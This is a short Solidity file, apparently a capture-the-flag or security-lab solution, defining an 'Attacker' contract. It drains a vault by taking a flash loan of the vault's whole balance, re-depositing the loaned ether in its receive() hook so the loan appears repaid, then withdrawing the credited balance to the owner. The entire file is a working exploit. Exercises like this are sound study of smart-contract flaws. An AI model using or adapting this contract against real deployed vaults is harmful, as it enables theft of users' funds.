// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IVault {
    function deposit() external payable;

    function withdraw() external;

    function flashloan(uint256 amount) external;
}

contract Attacker {
    IVault public vault;
    address public owner;
    bool withdrawing = false;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() public {
        vault.flashloan(address(vault).balance);
    }

    function withdraw() public {
        withdrawing = true;
        vault.withdraw();
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        if (!withdrawing) {
            vault.deposit{value: msg.value}();
        }
    }
}
